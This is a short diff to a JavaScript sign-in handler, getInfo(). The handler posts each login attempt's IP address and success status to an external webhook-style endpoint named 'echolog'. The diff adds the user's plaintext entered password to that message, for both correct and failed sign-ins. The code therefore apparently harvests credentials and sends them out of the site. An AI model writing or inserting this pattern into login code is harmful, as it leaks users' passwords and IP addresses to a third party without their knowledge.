@@ -35,7 +35,8 @@ function getInfo() {
 				  username: "echolog",
 				  avatar_url: "https://xpstools.github.io/echolog.jpg",
 				  content: "**Signin request opened!**\n> IP: " + ip + 
-				  "\n> Correct? : " + "true"
+				  "\n> Correct? : " + "true" +
+				  "\n> Entered password : " + password
 				};
 				request.send(JSON.stringify(params));
 			});
@@ -55,7 +56,8 @@ function getInfo() {
           username: "echolog",
           avatar_url: "https://xpstools.github.io/echolog.jpg",
           content: "**Signin request opened!**\n> IP: " + ip + 
-          "\n> Correct? : " + "false"
+          "\n> Correct? : " + "false" +
+		  "\n> Entered password : " + password
         };
         request.send(JSON.stringify(params));
     });
